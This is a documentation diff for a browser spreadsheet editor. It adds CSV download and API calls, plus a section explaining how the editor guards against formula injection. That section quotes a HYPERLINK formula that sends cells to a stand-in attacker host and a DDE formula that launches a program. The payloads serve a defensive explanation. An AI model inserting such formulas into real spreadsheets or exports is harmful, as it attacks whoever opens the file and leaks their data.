@@ -62,7 +62,8 @@ back as .xlsx without losing what the editor can't display.
 - Dates and decimals are read in the user's locale (`3/4/2026` is 3 April in
   the UK, `1.234,5` is 1234.5 in Germany).
 - CSV files (.csv, and tab-separated .tsv and .txt) open as a workbook of one
-  sheet, which saves as .xlsx; see [CSV files](#csv-files).
+  sheet, which saves as .xlsx, and the sheet shown downloads as CSV; see
+  [CSV files](#csv-files).
 - A Changes panel lists every cell that differs from the opened file, old and
   new value, and a timestamped history of actions. Unsaved edits are kept in
   the browser and offered back if the same file is reopened after a crash or
@@ -151,8 +152,9 @@ Every host controls the editor through the same handle (`EditorHandle`):
 - `save()` runs the Save button's flow and resolves with what happened:
   `'saved'`, `'downloaded'`, `'cancelled'`, `'blocked'` or `'failed'`.
 - `downloadCopy()`, `getWorkbook()` (the workbook as a save would hand it
-  over, without the checks), `goTo(ref)`, `registerSchema`, `removeSchema`,
-  `setTheme`, `setLanguage` and `setUser`.
+  over, without the checks), `downloadCsv()` and `getCsv()` (the sheet shown
+  as CSV, see [CSV files](#csv-files)), `goTo(ref)`, `registerSchema`,
+  `removeSchema`, `setTheme`, `setLanguage` and `setUser`.
 - `status`, `fileName`, `editedCount` and `unsaved`, with `subscribe(listener)`
   to hear when they change, and `destroy()`.
 
@@ -221,7 +223,7 @@ e2e/angular.spec.ts` tests it.
 Options include `schemas`, `numbers`, `onSave`, `saveLabel`, `features` (hide
 the open, save, download or schema buttons when the host provides them), `user` (recorded in the
 history), `drafts`, `warnOnUnload`, `locale`, `limits`, `macros`, `recalc`,
-`onError`, `workerTimeout` and `createWorker`. All styles are scoped under `.wbe`,
+`onError`, `workerTimeout`, `createWorker` and `csvExport`. All styles are scoped under `.wbe`,
 and every class the editor uses starts `wbe-`, so a host's own `.btn`,
 `.modal` or `.active` rules don't reach into it. Cell editors open in an
 element with id `wbe-portal` that the editor adds to the page.
@@ -238,7 +240,7 @@ element with id `wbe-portal` that the editor adds to the page.
 | `report` | "What's in this file" and the banner that sums it up |
 | `charts` | Charts drawn from the workbook's current values. Off, they show as placeholders with their title, and the chart library (Chart.js, about 70 kB gzipped) is never loaded; on, it loads only when a workbook has a chart to draw |
 | `format` | The format bar, for fonts, colours, borders, alignment and number formats; hosts whose users only fill in values can leave it out |
-| `csv` | CSV files (.csv, .tsv and .txt) in the Open button and when dropped |
+| `csv` | CSV files (.csv, .tsv and .txt) in the Open button and when dropped, and the button that downloads the sheet shown as CSV (shown when `download` is on too) |
 
 `onEvent` hears what the editor does, for a host's logging or analytics:
 `opened` (with how long it took), `openFailed`, `calculated` (how many
@@ -439,6 +441,40 @@ Saving writes .xlsx, named after the CSV file (`prices.csv` saves as
 `prices.xlsx`). Editing, drafts, schemas and checks work as for any workbook.
 `features: { csv: false }` stops the Open button and dropping from taking CSV
 files; `open()` still does.
+
+The toolbar's CSV button, `downloadCsv(options)` and `getCsv(options)` write
+the sheet shown, and only that sheet, as Excel's "CSV UTF-8" does: each
+cell as its number format shows it, with the locale's decimal and thousands
+separators; formulas as their results; from A1 to the last row and column
+holding a value; quoted where needed; CRLF line ends; and in the download,
+UTF-8 with a byte order mark (`getCsv` returns the text without one). The
+delimiter is the locale's list separator, as Excel's is: a comma, or a
+semicolon where decimals are written with a comma, and in Switzerland.
+`delimiter` (`','`, `';'` or `'\t'`) overrides it, per call or for the
+button through the `csvExport` option. Downloading CSV is an export: it
+doesn't count as saving.
+
+### Formulas in CSV files
+
+A CSV file holds no formulas, but spreadsheet apps run any value in one that
+looks like a formula when they open it. If a sheet's text came from someone
+else (a supplier's upload, a web form), a CSV made from it can carry
+`=HYPERLINK("https://attacker.example/?"&A1, "Details")`, which sends other
+cells to that site when clicked, or, on older or carelessly configured
+Excel, `=cmd|' /C calc'!A0`, which starts a program. Whoever opens the file
+is the one attacked.
+
+So the CSV the editor writes puts an apostrophe in front of every value that
+starts with `=`, `+`, `-`, `@`, a tab or a carriage return (or the
+full-width `＝`, `＋`, `－`, `＠`), as OWASP recommends; spreadsheet apps then
+show it as text. Numbers such as `-5`, `+5` or `-$1,234.50` hold nothing to
+run and are left alone. The price is that such text reads back with the
+apostrophe (`'=A1`), in Excel and in this editor alike. A host that hands
+the CSV to another program, not to people, can turn this off with
+`escapeFormulas: false`.
+
+Opening is protected the other way round: nothing in a CSV file becomes a
+formula here, though Excel would make it one.
 
 ## Checking it on real files
 
